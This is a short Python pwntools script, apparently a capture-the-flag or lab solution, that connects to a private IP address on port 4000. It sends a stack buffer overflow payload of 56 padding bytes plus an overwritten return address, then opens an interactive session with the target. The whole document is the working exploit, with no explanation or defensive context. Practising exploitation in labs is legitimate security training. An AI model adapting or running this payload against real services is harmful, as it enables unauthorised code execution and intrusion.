import pwn

HOST="172.25.106.194"

def exploit():
    conn = pwn.remote(HOST,4000)
    while conn.can_recv(timeout=1):
        conn.sendlineafter("=","A"*56+"\xa2\x11\x40\x00\x00\x00\x00\x00")
        conn.interactive()

if __name__ == "__main__":
    exploit()